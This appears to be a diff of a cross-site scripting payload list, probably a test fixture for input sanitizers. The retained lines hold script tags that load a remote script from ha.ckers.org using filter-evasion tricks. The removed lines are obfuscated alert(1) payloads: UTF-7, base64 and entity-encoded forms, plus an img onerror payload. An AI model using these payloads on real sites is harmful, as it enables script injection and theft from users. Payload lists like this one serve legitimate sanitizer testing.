@@ -74,15 +74,5 @@ a="get";
 <SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
 <SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>
 <SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi
-&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>
-PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
-&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;
-javascript:alert(1)
-alert(1)
-alert
-&#x61;l&#x65;rt&#40;1)
-alert&lpar;1&rpar;
-alert`1`
-alert\\`1\\`
+
 
